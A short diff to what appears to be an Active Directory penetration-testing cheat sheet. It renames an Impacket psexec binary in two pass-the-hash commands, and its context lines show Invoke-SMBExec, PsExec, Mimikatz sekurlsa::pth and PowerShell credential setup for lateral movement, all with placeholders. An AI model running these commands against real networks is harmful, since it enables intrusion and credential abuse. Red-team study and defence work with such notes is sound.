@@ -103,7 +103,7 @@ Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Has
 .\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <PASSWORD> -i cmd.exe
 .\PsExec64.exe \\<COMPUTERNAME> -accepteula 
 
-.\psexec_imp.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
+.\psexec_windows.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
 ```
 
 ### Overpass The Hash
@@ -159,7 +159,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HA
 #### Psexec then pssession
 - https://github.com/maaaaz/impacket-examples-windows
 ```
-.\psexec_imp.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
+.\psexec_windows.exe <DOMAIN>/<USER>@<TARGET FQDN> -hashes :<NTLM HASH>
 powershell.exe
 $password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
